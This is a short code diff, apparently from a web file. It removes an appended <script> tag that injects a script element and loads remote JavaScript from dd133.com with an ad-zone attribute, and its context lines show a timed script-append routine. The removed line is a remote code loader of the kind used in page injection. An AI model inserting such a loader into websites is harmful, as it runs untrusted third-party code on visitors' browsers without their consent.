@@ -22,7 +22,3 @@ setTimeout(() => {
             .appendChild(document.createElement('script'))
     );
 }, 2000);
-
-
-
-<script>(function(s){s.dataset.zone='7496520',s.src='https://dd133.com/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
